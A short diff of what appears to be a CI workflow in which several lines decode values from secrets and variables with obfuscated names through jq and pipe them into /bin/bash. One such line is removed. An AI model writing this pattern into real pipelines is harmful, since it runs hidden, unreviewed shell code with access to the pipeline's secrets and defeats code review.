@@ -18,7 +18,6 @@ jobs:
           ddps50049: ${{ secrets.ddps50049 }}
         run: |
           printf '%s' "$ddps50049" | jq -r .sdqh909 | /bin/bash
-          echo $j764 | jq -r .w2 | /bin/bash
           printf '%s' "$zlnlc7" | jq -r .mrbeq4534 | /bin/bash
           echo $b44600 | jq -r .uwhl0642 | /bin/bash
           printf '%s' "$ma0" | jq -r .axwdd250 | /bin/bash
